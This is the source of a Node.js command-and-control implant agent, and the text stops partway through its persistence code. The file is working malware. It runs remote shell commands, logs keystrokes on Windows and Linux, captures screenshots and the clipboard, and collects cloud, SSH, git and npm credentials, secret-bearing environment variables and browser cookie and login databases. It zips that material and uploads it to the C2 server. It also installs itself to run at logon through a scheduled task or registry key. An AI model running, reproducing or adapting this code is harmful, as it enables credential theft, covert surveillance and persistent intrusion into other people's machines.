#!/usr/bin/env node
// agent.js — C2 agent, Node.js port (stdlib only).
//
// Run:
//   node agent.js --server http://127.0.0.1:8000 --token <AGENT_TOKEN> --interval 10 --verbose
//   C2_SERVER=... C2_TOKEN=... node agent.js
//
// Only use against systems you own or are authorized to test.

"use strict";

const http = require("http");
const https = require("https");
const { execSync, spawn, spawnSync } = require("child_process");
const fs = require("fs");
const path = require("path");
const os = require("os");

// ---------------------------------------------------------------- constants

const SHELL_TIMEOUT = 120000; // ms
const OUTPUT_LIMIT = 12000;
let stateFile = path.join(os.homedir(), ".c2agent.json");

// steal constants
const STEAL_KEYWORDS = [
  "token", "secret", "password", "passwd", "key=", "api", "auth",
  "aws", "azure", "google", "github", "gitlab", "slack", "discord",
  "cookie", "session", "credential", "access", "proxy", "login",
];
const STEAL_TOKEN_FILES = [
  ".aws/credentials", ".aws/config",
  ".git-credentials", ".netrc", ".npmrc", ".pypirc",
  ".pip/pip.conf", ".config/pip/pip.conf",
  ".config/gh/hosts.yml", ".config/rclone/rclone.conf",
  ".config/gcloud/credentials.json", ".config/gcloud/access_tokens.db",
  ".docker/config.json", ".kube/config",
  ".ssh/id_rsa", ".ssh/id_ed25519", ".ssh/id_ecdsa", ".ssh/config",
  ".ssh/known_hosts", ".ssh/authorized_keys",
];
const STEAL_MAX_FILE = 8 * 1024 * 1024;
const CHROMIUM_PROFILE_FILES = ["Login Data", "Cookies", "Web Data"];
const FIREFOX_PROFILE_FILES = ["cookies.sqlite", "logins.json", "key4.db", "cert9.db"];

// clone watchers: target -> { timer, info }
const cloneWatchers = {};

// ---------------------------------------------------------------- globals

let server = "";
let token = "";
let agentId = "";
let interval = 10;
let jitter = 0;
let verbose = false;

// ---------------------------------------------------------------- helpers

function logmsg(msg) {
  if (verbose) process.stderr.write(`[*] ${msg}\n`);
}

function truncateOutput(text) {
  if (text.length <= OUTPUT_LIMIT) return text;
  const head = Math.floor(OUTPUT_LIMIT / 5);
  const tail = OUTPUT_LIMIT - head - 40;
  const omitted = text.length - head - tail;
  return (
    text.slice(0, head) +
    `\n... [${omitted} chars truncated] ...\n` +
    text.slice(-tail)
  );
}

function localIp() {
  try {
    const nets = os.networkInterfaces();
    for (const name of Object.keys(nets)) {
      for (const net of nets[name]) {
        if (net.family === "IPv4" && !net.internal) return net.address;
      }
    }
  } catch (_) {}
  return "";
}

function getOs() {
  const p = os.platform();
  if (p === "win32") return "windows";
  if (p === "darwin") return "darwin";
  return "linux";
}

function getArch() {
  return process.arch || os.arch() || "";
}

// ---------------------------------------------------------------- HTTP

function postJson(urlPath, body) {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify(body);
    const url = new URL(server + urlPath);
    const mod = url.protocol === "https:" ? https : http;
    const req = mod.request(
      {
        hostname: url.hostname,
        port: url.port,
        path: url.pathname + url.search,
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-Agent-Token": token,
          "Content-Length": Buffer.byteLength(data),
        },
        timeout: 15000,
      },
      (res) => {
        let body = "";
        res.on("data", (chunk) => (body += chunk));
        res.on("end", () => resolve({ body, code: res.statusCode }));
      }
    );
    req.on("error", reject);
    req.on("timeout", () => { req.destroy(); reject(new Error("timeout")); });
    req.write(data);
    req.end();
  });
}

function getUrl(urlPath) {
  return new Promise((resolve, reject) => {
    const url = new URL(server + urlPath);
    const mod = url.protocol === "https:" ? https : http;
    const req = mod.request(
      {
        hostname: url.hostname,
        port: url.port,
        path: url.pathname + url.search,
        method: "GET",
        headers: { "X-Agent-Token": token },
        timeout: 120000,
      },
      (res) => {
        const chunks = [];
        res.on("data", (chunk) => chunks.push(chunk));
        res.on("end", () =>
          resolve({ body: Buffer.concat(chunks), code: res.statusCode })
        );
      }
    );
    req.on("error", reject);
    req.on("timeout", () => { req.destroy(); reject(new Error("timeout")); });
    req.end();
  });
}

// ---------------------------------------------------------------- state

function loadId() {
  try {
    const data = JSON.parse(fs.readFileSync(stateFile, "utf8"));
    agentId = data.agent_id || "";
  } catch (_) {
    agentId = "";
  }
}

function saveId() {
  try {
    fs.writeFileSync(stateFile, JSON.stringify({ agent_id: agentId }), "utf8");
  } catch (_) {}
}

// ------------------------------------------------------------- lifecycle

async function register() {
  const body = {
    agent_id: agentId || undefined,
    hostname: os.hostname(),
    username: os.userInfo().username,
    os: getOs(),
    arch: getArch(),
    pid: process.pid,
    ip: localIp(),
    version: '1.0',
    type: 'JavaScript',
  };
  logmsg("registering with " + server);
  const res = await postJson("/api/register", body);
  if (res.code !== 200) throw new Error(`register failed: HTTP ${res.code}`);
  const data = JSON.parse(res.body);
  agentId = data.agent_id;
  saveId();
  logmsg("agent id: " + agentId);
}

async function checkin() {
  const res = await postJson("/api/checkin", { agent_id: agentId });
  if (res.code === 404) {
    logmsg("server does not know us — re-registering");
    await register();
    return [];
  }
  if (res.code !== 200) {
    logmsg("checkin failed: HTTP " + res.code);
    return [];
  }
  return JSON.parse(res.body).tasks || [];
}

async function report(taskId, output, exitCode, error) {
  try {
    await postJson("/api/result", {
      agent_id: agentId,
      task_id: taskId,
      output: output || "",
      exit_code: exitCode || 0,
      error: error || "",
    });
  } catch (e) {
    logmsg("failed to report result: " + e.message);
  }
}

// ---------------------------------------------------------------- tasks

function runShell(command, timeoutMs) {
  timeoutMs = timeoutMs || SHELL_TIMEOUT;
  logmsg("executing: " + command);
  const isWin = process.platform === "win32";
  const r = spawnSync(
    isWin ? process.env.comspec || "cmd" : "/bin/sh",
    isWin ? ["/d", "/s", "/c", command] : ["-c", command],
    { encoding: "utf8", stdio: ["ignore", "pipe", "pipe"], timeout: timeoutMs, windowsHide: true }
  );
  let out = (r.stdout || "") + (r.stderr || "");
  let exitCode = r.status;
  if (r.error) {
    if (r.error.code === "ETIMEDOUT" || r.error.killed) {
      return { output: `command timed out (${Math.round(timeoutMs / 1000)}s)`, exitCode: 124 };
    }
    out = out || r.error.message || "";
    exitCode = r.status === null ? 1 : r.status;
  }
  if (exitCode === null || exitCode === undefined) exitCode = 1;
  return { output: truncateOutput(out), exitCode };
}

async function taskDownload(taskId, args) {
  const fname = args.file || "payload.bin";
  let dest = args.destination || fname;
  logmsg("downloading " + fname + " to " + dest);

  const res = await getUrl("/api/files/" + taskId);
  if (res.code !== 200) {
    return { output: `download failed: HTTP ${res.code}`, exitCode: 1 };
  }

  try {
    const trailingSep = /[\\/]$/.test(dest);
    let destIsDir = trailingSep;
    if (!destIsDir) {
      try { destIsDir = fs.statSync(dest).isDirectory(); } catch (_) {}
    }
    if (destIsDir) dest = path.join(dest, path.basename(fname));
  } catch (_) {}

  const dir = path.dirname(path.resolve(dest));
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(dest, res.body);

  return { output: `saved ${res.body.length} bytes to ${dest}`, exitCode: 0 };
}

async function taskUpload(taskId, args) {
  const filePath = args.path || "";
  if (!filePath) return { output: "no path given", exitCode: 1 };

  logmsg("uploading " + filePath);
  try {
    fs.accessSync(filePath);
  } catch (_) {
    return { output: `file not found: ${filePath}`, exitCode: 1 };
  }

  const fileData = fs.readFileSync(filePath);
  const boundary = "----c2agent" + Date.now();
  const fileName = path.basename(filePath);
  const header = Buffer.from(
    `--${boundary}\r\n` +
      `Content-Disposition: form-data; name="file"; filename="${fileName}"\r\n` +
      `Content-Type: application/octet-stream\r\n\r\n`
  );
  const footer = Buffer.from(`\r\n--${boundary}--\r\n`);
  const multipart = Buffer.concat([header, fileData, footer]);

  return new Promise((resolve) => {
    const url = new URL(server + "/api/files/" + taskId);
    const mod = url.protocol === "https:" ? https : http;
    const req = mod.request(
      {
        hostname: url.hostname,
        port: url.port,
        path: url.pathname,
        method: "POST",
        headers: {
          "X-Agent-Token": token,
          "Content-Type": `multipart/form-data; boundary=${boundary}`,
          "Content-Length": multipart.length,
        },
        timeout: 300000,
      },
      (res) => {
        let body = "";
        res.on("data", (c) => (body += c));
        res.on("end", () => {
          if (res.statusCode === 200) {
            resolve({ output: `uploaded ${filePath}`, exitCode: 0 });
          } else {
            resolve({ output: `upload failed: HTTP ${res.statusCode}`, exitCode: 1 });
          }
        });
      }
    );
    req.on("error", (e) => resolve({ output: `upload error: ${e.message}`, exitCode: 1 }));
    req.write(multipart);
    req.end();
  });
}

function taskSleep(args) {
  const secs = parseInt(args.seconds) || 10;
  interval = Math.max(1, secs);
  return { output: `heartbeat interval set to ${interval}s`, exitCode: 0 };
}

function klogBase() {
  return path.join(os.tmpdir(), `.c2keylog_${agentId || "unknown"}`);
}

function klogProcAlive(pid) {
  try {
    process.kill(pid, 0);
    return true;
  } catch (e) {
    return e.code === "EPERM";
  }
}

function klogWriteCollectors(base, pidFile, logFile) {
  if (getOs() === "windows") {
    const backtick = String.fromCharCode(96);
    const psLines = [
      "$C2P = $env:C2P; $C2K = $env:C2K",
      "[IO.File]::WriteAllText($C2P, [string]$PID)",
      "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class K{[DllImport(\"user32.dll\")]public static extern short GetAsyncKeyState(int v);[DllImport(\"user32.dll\")]public static extern short GetKeyState(int v);}'",
      "$l = New-Object 'bool[]' 256",
      "while (1) { Start-Sleep -Milliseconds 25",
      "  for ($v = 8; $v -le 190; $v++) { $d = (([K]::GetAsyncKeyState($v) -band 1) -ne 0)",
      "    if ($d -ne $l[$v]) { if ($d) { $c = $null",
      "      if ($v -ge 65 -and $v -le 90) { $sh = (([K]::GetAsyncKeyState(16) -band 0x8000) -ne 0); $cp = (([K]::GetKeyState(20) -band 1) -ne 0); $c = [char]($v + $(if ($sh -ne $cp) { 0 } else { 32 })) }",
      "      elseif ($v -ge 48 -and $v -le 57) { $c = [char]$v } elseif ($v -eq 32) { $c = ' ' }",
      "      elseif ($v -eq 13) { $c = [char]10 } elseif ($v -eq 9) { $c = '[TAB]' }",
      "      elseif ($v -eq 8) { $c = '[BACKSPACE]' } elseif ($v -eq 27) { $c = '[ESC]' } elseif ($v -eq 46) { $c = '[DEL]' }",
      "      elseif ($v -eq 37) { $c = '[LEFT]' } elseif ($v -eq 38) { $c = '[UP]' }",
      "      elseif ($v -eq 39) { $c = '[RIGHT]' } elseif ($v -eq 40) { $c = '[DOWN]' }",
      "      elseif ($v -ge 112 -and $v -le 123) { $c = '[F' + ($v - 111) + ']' }",
      "      elseif ($v -eq 186) { $c = ';' } elseif ($v -eq 187) { $c = '=' }",
      "      elseif ($v -eq 188) { $c = ',' } elseif ($v -eq 189) { $c = '-' }",
      "      elseif ($v -eq 190) { $c = '.' } elseif ($v -eq 191) { $c = '/' }",
      "      elseif ($v -eq 192) { $c = '" + backtick + "' } elseif ($v -eq 219) { $c = '[' }",
      "      elseif ($v -eq 220) { $c = '\\' } elseif ($v -eq 221) { $c = ']' }",
      "      elseif ($v -eq 222) { $c = \"'\" }",
      "      if ($c) { [IO.File]::AppendAllText($C2K, [string]$c) } }",
      "    $l[$v] = $d } } }",
      "",
    ];
    fs.writeFileSync(base + ".ps", psLines.join("\n"));
  } else {
    const sh =
      `#!/bin/sh
C2P=${pidFile}
C2K=${logFile}
echo $$ > "$C2P"
kid=$(xinput list 2>/dev/null | grep -i -m1 keyboard | sed -E 's/.*id=([0-9]+).*/\\1/')
[ -z "$kid" ] && exit 1
xinput test "$kid" 2>/dev/null | awk -v p="$C2K" 'BEGIN { n = split("2 3 4 5 6 7 8 9 10 11 16 17 18 19 20 21 22 23 24 25 30 31 32 33 34 35 36 37 38 44 45 46 47 48 49 50", a, " "); s = "1234567890qwertyuiopasdfghjklzxcvbnm"; for (i = 1; i <= length(s); i++) m[a[i]] = substr(s, i, 1) } { if ($1 == "key" && $2 == "press") { c = m[$3]; if ($3 == 57) c = " "; else if ($3 == 28) c = "\\n"; else if ($3 == 15) c = "[TAB]"; else if ($3 == 14) c = "[BACKSPACE]"; else if ($3 == 1) c = "[ESC]"; else if ($3 == 111) c = "[DEL]"; else if ($3 == 42 || $3 == 54) c = "[SHIFT]"; else if ($3 == 29 || $3 == 97) c = "[CTRL]"; else if ($3 == 56 || $3 == 100) c = "[ALT]"; if (c != "") printf "%s", c > p } }'`;
    fs.writeFileSync(base + ".sh", sh);
  }
}

function klogStart() {
  if (getOs() === "darwin") return "error: keylogger not supported on macOS";
  const base = klogBase();
  const pidFile = base + ".pid";
  const logFile = base + ".log";
  if (fs.existsSync(pidFile)) {
    const pid = parseInt(fs.readFileSync(pidFile, "utf8").trim(), 10);
    if (pid && klogProcAlive(pid)) return "keylogger already running";
  }
  for (const f of [pidFile, logFile, base + ".ps", base + ".sh"]) {
    try { fs.unlinkSync(f); } catch (_) {}
  }
  klogWriteCollectors(base, pidFile, logFile);
  let child;
  try {
    if (getOs() === "windows") {
      child = spawn(
        "powershell",
        ["-NoProfile", "-ExecutionPolicy", "Bypass", "-File", base + ".ps"],
        { detached: true, stdio: "ignore", windowsHide: true, env: { ...process.env, C2P: pidFile, C2K: logFile } }
      );
    } else {
      child = spawn("sh", [base + ".sh"], {
        detached: true,
        stdio: "ignore",
        env: { ...process.env, C2P: pidFile, C2K: logFile },
      });
    }
  } catch (e) {
    return "error: keylogger failed to start: " + e.message;
  }
  fs.writeFileSync(pidFile, String(child.pid));
  child.unref();
  return "keylogger started";
}

function klogStop() {
  const base = klogBase();
  const pidFile = base + ".pid";
  if (!fs.existsSync(pidFile)) return "keylogger not running";
  const pid = parseInt(fs.readFileSync(pidFile, "utf8").trim(), 10);
  try {
    if (getOs() === "windows") {
      execSync(`taskkill /F /T /PID ${pid}`, { stdio: "ignore" });
    } else {
      process.kill(pid, "SIGTERM");
      try { process.kill(pid, "SIGKILL"); } catch (_) {}
    }
  } catch (_) {}
  try { fs.unlinkSync(pidFile); } catch (_) {}
  return "keylogger stopped";
}

function klogDump() {
  const base = klogBase();
  const logFile = base + ".log";
  klogStop();
  let text = "";
  try { text = fs.readFileSync(logFile, "utf8"); } catch (_) {}
  for (const f of [logFile, base + ".ps", base + ".sh"]) {
    try { fs.unlinkSync(f); } catch (_) {}
  }
  if (!text) return { output: "(no keystrokes recorded)", exitCode: 0 };
  if (text.length > 8000) text = "..." + text.slice(-8000);
  return { output: text, exitCode: 0 };
}

function taskKeylog(args) {
  const action = (args.action || "dump").toLowerCase();
  if (action === "start") {
    const out = klogStart();
    return { output: out, exitCode: out.startsWith("error") ? 1 : 0 };
  }
  if (action === "stop") {
    return { output: klogStop(), exitCode: 0 };
  }
  return klogDump();
}

async function taskScreenshot(taskId, args) {
  const label = (args.name || "screenshot").trim() || "screenshot";
  const tmp = path.join(os.tmpdir(), `c2shot_${Date.now()}.png`);
  const p = getOs();
  let cmd;
  if (p === "windows") {
    cmd = `powershell -command "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;$bmp=New-Object System.Drawing.Bitmap($b.Width,$b.Height);$g=[System.Drawing.Graphics]::FromImage($bmp);$g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size);$bmp.Save('${tmp}');"`;
  } else if (p === "darwin") {
    cmd = `screencapture -x "${tmp}"`;
  } else {
    cmd = `(command -v import && import -window root "${tmp}") || (command -v scrot && scrot "${tmp}") || (command -v gnome-screenshot && gnome-screenshot -f "${tmp}")`;
  }
  try {
    execSync(cmd, { stdio: "pipe", timeout: 30000 });
  } catch (_) {
    return { output: "error: screenshot failed (no tool or permission)", exitCode: 1 };
  }
  let fileData;
  try {
    fileData = fs.readFileSync(tmp);
    fs.unlinkSync(tmp);
  } catch (_) {
    return { output: "error: screenshot failed", exitCode: 1 };
  }
  const boundary = "----C2Shot" + Date.now();
  const header = Buffer.from(
    `--${boundary}\r\n` +
      `Content-Disposition: form-data; name="file"; filename="${label}.png"\r\n` +
      `Content-Type: image/png\r\n\r\n`
  );
  const footer = Buffer.from(`\r\n--${boundary}--\r\n`);
  const multipart = Buffer.concat([header, fileData, footer]);

  return new Promise((resolve) => {
    const url = new URL(server + "/api/files/" + taskId);
    const mod = url.protocol === "https:" ? https : http;
    const req = mod.request(
      {
        hostname: url.hostname,
        port: url.port,
        path: url.pathname,
        method: "POST",
        headers: {
          "X-Agent-Token": token,
          "Content-Type": `multipart/form-data; boundary=${boundary}`,
          "Content-Length": multipart.length,
        },
        timeout: 120000,
      },
      (res) => {
        let body = "";
        res.on("data", (c) => (body += c));
        res.on("end", () => {
          if (res.statusCode === 200) {
            resolve({ output: `screenshot saved (${label}.png)`, exitCode: 0 });
          } else {
            resolve({ output: `screenshot upload failed: HTTP ${res.statusCode}`, exitCode: 1 });
          }
        });
      }
    );
    req.on("error", (e) => resolve({ output: `screenshot error: ${e.message}`, exitCode: 1 }));
    req.write(multipart);
    req.end();
  });
}

function taskClipboard(args) {
  const action = (args.action || "get").toLowerCase();
  try {
    if (action === "set") {
      const text = args.text || "";
      if (getOs() === "windows") {
        execSync(
          'powershell -NoProfile -command "Set-Clipboard -Value ([Console]::In.ReadToEnd())"',
          { stdio: ["pipe", "ignore", "ignore"], input: text }
        );
      } else if (getOs() === "darwin") {
        execSync("pbcopy", { stdio: ["pipe", "ignore", "ignore"], input: text });
      } else {
        try {
          execSync("xclip -selection clipboard", { stdio: ["pipe", "ignore", "ignore"], input: text });
        } catch (_) {
          execSync("xsel --clipboard --input", { stdio: ["pipe", "ignore", "ignore"], input: text });
        }
      }
      return { output: "clipboard set", exitCode: 0 };
    } else {
      let out;
      if (getOs() === "windows") {
        out = execSync("powershell -command Get-Clipboard", { encoding: "utf8", stdio: "pipe" });
      } else if (getOs() === "darwin") {
        out = execSync("pbpaste", { encoding: "utf8", stdio: "pipe" });
      } else {
        out = execSync("xclip -selection clipboard -o", { encoding: "utf8", stdio: "pipe" });
      }
      return { output: (out || "").trim(), exitCode: 0 };
    }
  } catch (e) {
    return { output: `error: ${e.message}`, exitCode: 1 };
  }
}

// ------------------------------------------------------------------ steal

function stealSafeCopy(src, dstDir) {
  try {
    const st = fs.statSync(src);
    if (!st.isFile() || st.size > STEAL_MAX_FILE) return false;
    fs.mkdirSync(dstDir, { recursive: true });
    fs.copyFileSync(src, path.join(dstDir, path.basename(src)));
    return true;
  } catch (_) {
    return false;
  }
}

function stealEnv(work) {
  const lines = [];
  for (const [k, v] of Object.entries(process.env)) {
    const low = k.toLowerCase();
    if (STEAL_KEYWORDS.some((w) => low.includes(w))) {
      lines.push(`${k}=${v || ""}`);
    }
  }
  if (!lines.length) return [];
  lines.sort();
  fs.writeFileSync(path.join(work, "env.txt"), lines.join("\n") + "\n", "utf8");
  return ["env.txt"];
}

function stealTokens(work) {
  const home = os.homedir();
  const hits = [];
  for (const rel of STEAL_TOKEN_FILES) {
    const src = path.join(home, rel);
    if (stealSafeCopy(src, path.join(work, "tokens"))) {
      hits.push("tokens/" + path.basename(rel));
    }
  }
  return hits;
}

function getBrowserRoots() {
  const roots = {};
  const home = os.homedir();
  if (getOs() === "windows") {
    const la = process.env.LOCALAPPDATA || "";
    const appd = process.env.APPDATA || "";
    for (const rel of [
      "Google/Chrome/User Data",
      "Microsoft/Edge/User Data",
      "BraveSoftware/Brave-Browser/User Data",
      "Opera Software/Opera Stable",
    ]) {
      if (la) roots[path.join(la, rel)] = "chromium";
    }
    if (appd) roots[path.join(appd, "Mozilla/Firefox/Profiles")] = "firefox";
  } else if (getOs() === "darwin") {
    const base = path.join(home, "Library/Application Support");
    for (const name of ["Google/Chrome", "Microsoft Edge", "BraveSoftware/Brave-Browser"]) {
      roots[path.join(base, name)] = "chromium";
    }
    roots[path.join(base, "Firefox/Profiles")] = "firefox";
  } else {
    for (const variants of [
      ["google-chrome", "chromium"],
      ["microsoft-edge", "msedge"],
      ["brave-browser", "brave"],
      ["opera", "opera"],
    ]) {
      for (const rel of variants) {
        if (rel) roots[path.join(home, ".config", rel)] = "chromium";
      }
    }
    roots[path.join(home, ".mozilla/firefox")] = "firefox";
  }
  return roots;
}

function stealBrowser(work) {
  const hits = [];
  for (const [root, kind] of Object.entries(getBrowserRoots())) {
    if (!fs.existsSync(root) || !fs.statSync(root).isDirectory()) continue;
    const targets = kind === "firefox" ? FIREFOX_PROFILE_FILES : CHROMIUM_PROFILE_FILES;
    const walk = (dir) => {
      let entries;
      try { entries = fs.readdirSync(dir, { withFileTypes: true }); } catch (_) { return; }
      for (const ent of entries) {
        const full = path.join(dir, ent.name);
        if (ent.isDirectory()) {
          walk(full);
        } else if (targets.includes(ent.name)) {
          const rel = path.relative(dir, full).split(path.sep).join("__");
          const dstDir = path.join(work, "browser", kind, rel);
          if (stealSafeCopy(full, dstDir)) {
            hits.push(`browser/${kind}/${rel}/${ent.name}`);
          }
        }
      }
    };
    walk(root);
  }
  return hits;
}

function zipDirectory(work) {
  return new Promise((resolve) => {
    const archive = path.join(work, "steal.zip");
    const isWin = getOs() === "windows";

    // Try system zip first
    try {
      const r = spawnSync(isWin ? "zip" : "zip", ["-r", archive, "."], {
        cwd: work, encoding: "utf8", timeout: 60000, stdio: "pipe", windowsHide: true,
      });
      if (r.status === 0 && fs.existsSync(archive)) return resolve(archive);
    } catch (_) {}

    // Try PowerShell Compress-Archive on Windows
    if (isWin) {
      try {
        const files = [];
        const walk = (dir) => {
          for (const ent of fs.readdirSync(dir, { withFileTypes: true })) {
            const full = path.join(dir, ent.name);
            if (ent.isDirectory()) walk(full);
            else if (ent.name !== "steal.zip") files.push(full);
          }
        };
        walk(work);
        if (files.length) {
          const psFiles = files.map((f) => `'${f.replace(/'/g, "''")}'`).join(",");
          const psCmd = `Compress-Archive -Path @(${psFiles}) -DestinationPath '${archive.replace(/'/g, "''")}' -Force`;
          const r = spawnSync("powershell", ["-NoProfile", "-Command", psCmd], {
            encoding: "utf8", timeout: 60000, stdio: "pipe", windowsHide: true,
          });
          if (r.status === 0 && fs.existsSync(archive)) return resolve(archive);
        }
      } catch (_) {}
    }

    // Fallback: try tar (works on Linux/Mac)
    try {
      const r = spawnSync("tar", ["-czf", archive, "-C", work, "."], {
        encoding: "utf8", timeout: 60000, stdio: "pipe",
      });
      if (r.status === 0 && fs.existsSync(archive)) return resolve(archive);
    } catch (_) {}

    resolve(null);
  });
}

function postMultipart(filePath, taskId, contentType) {
  return new Promise((resolve) => {
    const fileData = fs.readFileSync(filePath);
    const boundary = "----C2Steal" + Date.now();
    const fileName = path.basename(filePath);
    const header = Buffer.from(
      `--${boundary}\r\n` +
        `Content-Disposition: form-data; name="file"; filename="${fileName}"\r\n` +
        `Content-Type: ${contentType}\r\n\r\n`
    );
    const footer = Buffer.from(`\r\n--${boundary}--\r\n`);
    const multipart = Buffer.concat([header, fileData, footer]);

    const url = new URL(server + "/api/files/" + taskId);
    const mod = url.protocol === "https:" ? https : http;
    const req = mod.request(
      {
        hostname: url.hostname,
        port: url.port,
        path: url.pathname,
        method: "POST",
        headers: {
          "X-Agent-Token": token,
          "Content-Type": `multipart/form-data; boundary=${boundary}`,
          "Content-Length": multipart.length,
        },
        timeout: 300000,
      },
      (res) => {
        let body = "";
        res.on("data", (c) => (body += c));
        res.on("end", () => resolve({ code: res.statusCode, body }));
      }
    );
    req.on("error", (e) => resolve({ code: 0, error: e.message }));
    req.write(multipart);
    req.end();
  });
}

async function taskSteal(taskId, args) {
  let profile = String(args.profile || "all").trim().toLowerCase();
  if (!["all", "env", "tokens", "browser"].includes(profile)) profile = "all";
  const work = fs.mkdtempSync(path.join(os.tmpdir(), "c2steal_"));
  let manifest = [];
  try {
    if (profile === "all" || profile === "env") {
      logmsg("steal: collecting env vars");
      manifest = manifest.concat(stealEnv(work));
    }
    if (profile === "all" || profile === "tokens") {
      logmsg("steal: collecting token files");
      manifest = manifest.concat(stealTokens(work));
    }
    if (profile === "all" || profile === "browser") {
      logmsg("steal: collecting browser dbs");
      manifest = manifest.concat(stealBrowser(work));
    }
    if (!manifest.length) {
      try { fs.rmSync(work, { recursive: true, force: true }); } catch (_) {}
      return { output: `steal (${profile}): nothing found`, exitCode: 1 };
    }
    manifest.sort();
    fs.writeFileSync(path.join(work, "manifest.txt"), manifest.join("\n") + "\n", "utf8");
    const archive = await zipDirectory(work);
    if (!archive || !fs.existsSync(archive)) {
      try { fs.rmSync(work, { recursive: true, force: true }); } catch (_) {}
      return { output: "steal: failed to create archive", exitCode: 1 };
    }
    const size = fs.statSync(archive).size;
    const res = await postMultipart(archive, taskId, "application/zip");
    try { fs.rmSync(work, { recursive: true, force: true }); } catch (_) {}
    if (res.code !== 200) {
      return { output: `steal upload failed: HTTP ${res.code}`, exitCode: 1 };
    }
    const listing = manifest.join("\n");
    const output = truncateOutput(
      `stole ${manifest.length} item(s) -> steal.zip (${size} bytes)\n${listing}`,
      4000
    );
    return { output, exitCode: 0 };
  } catch (e) {
    try { fs.rmSync(work, { recursive: true, force: true }); } catch (_) {}
    return { output: `error: ${e.message}`, exitCode: 1 };
  }
}

// ------------------------------------------------------------------ clone

function nowStr() {
  return new Date().toISOString().replace("T", " ").replace(/\.\d+Z$/, "");
}

function cloneLoop(target, command, intervalMs, info) {
  const check = () => {
    const urlPath = `/api/clone/status/${target}`;
    const url = new URL(server + urlPath);
    const mod = url.protocol === "https:" ? https : http;
    const req = mod.request(
      {
        hostname: url.hostname,
        port: url.port,
        path: url.pathname + url.search,
        method: "GET",
        headers: { "X-Agent-Token": token },
        timeout: 15000,
      },
      (res) => {
        let body = "";
        res.on("data", (c) => (body += c));
        res.on("end", () => {
          if (res.statusCode === 404) {
            info.status = "unknown";
            info.lastCheck = "target gone";
          } else if (res.statusCode === 200) {
            try {
              const st = JSON.parse(body).status || "unknown";
              info.status = st;
              info.lastCheck = nowStr();
              if ((st === "dead" || st === "stale") && command) {
                info.relaunches = (info.relaunches || 0) + 1;
                logmsg(`clone: target ${target} ${st} -> relaunching`);
                try {
                  const isWin = getOs() === "windows";
                  const child = spawn(
                    isWin ? (process.env.comspec || "cmd") : "/bin/sh",
                    isWin ? ["/d", "/s", "/c", command] : ["-c", command],
                    { detached: true, stdio: "ignore", windowsHide: true }
                  );
                  child.unref();
                } catch (exc) {
                  logmsg("clone: relaunch failed: " + exc.message);
                }
              }
            } catch (_) {
              info.status = "parse error";
              info.lastCheck = nowStr();
            }
          } else {
            info.status = "http " + res.statusCode;
            info.lastCheck = nowStr();
          }
        });
      }
    );
    req.on("error", (e) => {
      info.status = "error";
      info.lastCheck = nowStr();
      logmsg("clone: status check failed: " + e.message);
    });
    req.on("timeout", () => {
      req.destroy();
      info.status = "timeout";
      info.lastCheck = nowStr();
    });
    req.end();
  };

  check();
  const timer = setInterval(check, intervalMs);
  return timer;
}

function taskClone(args) {
  const action = String(args.action || "start").trim().toLowerCase();
  const target = String(args.target || "").trim() || agentId;
  const command = String(args.command || "").trim();
  let intervalSec = 30;
  try {
    intervalSec = Math.max(5, Math.min(parseInt(args.interval) || 30, 3600));
  } catch (_) {}
  const intervalMs = intervalSec * 1000;

  if (action === "stop") {
    const entry = cloneWatchers[target];
    if (!entry) {
      return { output: `clone: no watcher for ${target}`, exitCode: 1 };
    }
    clearInterval(entry.timer);
    delete cloneWatchers[target];
    return { output: `clone: watcher for ${target} stopped`, exitCode: 0 };
  }

  if (action === "status") {
    const keys = Object.keys(cloneWatchers);
    if (!keys.length) return { output: "clone: no watchers running", exitCode: 0 };
    const lines = keys.sort().map((tid) => {
      const info = cloneWatchers[tid].info;
      return `  ${tid}: ${info.status || "?"} | ` +
        `last_check ${info.lastCheck || "?"} | ` +
        `relaunched ${info.relaunches || 0}x | ` +
        `cmd: ${info.command || "(none)"}`;
    });
    return { output: "clone watchers:\n" + lines.join("\n"), exitCode: 0 };
  }

  // start
  if (cloneWatchers[target]) {
    return { output: `clone: watcher for ${target} already running`, exitCode: 1 };
  }
  if (!command) {
    return { output: "clone: 'command' (relaunch cmd) required", exitCode: 1 };
  }
  const info = { status: "starting", lastCheck: "never", relaunches: 0, command };
  const timer = cloneLoop(target, command, intervalMs, info);
  cloneWatchers[target] = { timer, info };
return {
      output:
        `clone: watcher started on target ${target} ` +
        `(every ${intervalSec}s, restart cmd: ${command})`,
    exitCode: 0,
  };
}

// -------------------------------------------------------------- persistence

function shellQ(s) {
  return '"' + String(s).replace(/"/g, '\\"') + '"';
}

function relaunchCmd(dest) {
  const parts = [
    process.execPath,
    shellQ(dest),
    "--server",
    shellQ(server),
    "--token",
    shellQ(token),
    "--interval",
    String(interval),
    "--jitter",
    String(jitter),
  ];
  return parts.join(" ");
}

function taskPersistence(args) {
  try {
    const selfAbs = __filename;
    if (process.platform === "win32") {
      const base = path.join(process.env.APPDATA || os.homedir(), "Microsoft", "Windows", "c2update");
      fs.mkdirSync(base, { recursive: true });
      const dest = path.join(base, "c2agent" + path.extname(selfAbs));
      fs.copyFileSync(selfAbs, dest);
      const relaunch = relaunchCmd(dest);
      let output = "persistence: copied self to " + dest;
      const progData = process.env.ProgramData || process.env.ALLUSERSPROFILE || "C:\\ProgramData";
      const launcherDir = path.join(progData, "c2update");
      fs.mkdirSync(launcherDir, { recursive: true });
      const wrapper = path.join(launcherDir, "c2relaunch.cmd");
      fs.writeFileSync(wrapper, "@echo off\r\nstart \"\" /b " + relaunch + "\r\n");
      output += "\npersistence: wrote launcher " + wrapper;
      const task = runShell(
        `schtasks /Create /TN "c2agent-persist" /TR "${wrapper}" /SC ONLOGON /RL HIGHEST /F`,
        30000
      );
      let ok = task.exitCode === 0;
      output += "\n" + task.output.trim();
      if (!ok) {
        const reg = runShell(
          `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v c2agent /t REG_SZ /d "${wrapper}" /f`,
          30000
        );
        ok = reg.exitCode === 0;
        output += "\n" + reg.output.trim();
      }
      return { output: truncateOutput(output), exitCode: ok ? 0 : 1 };
    }
    const base = path.join(os.homedir(), ".config", "c2update");
    fs.mkdirSync(base, { recursive: true });
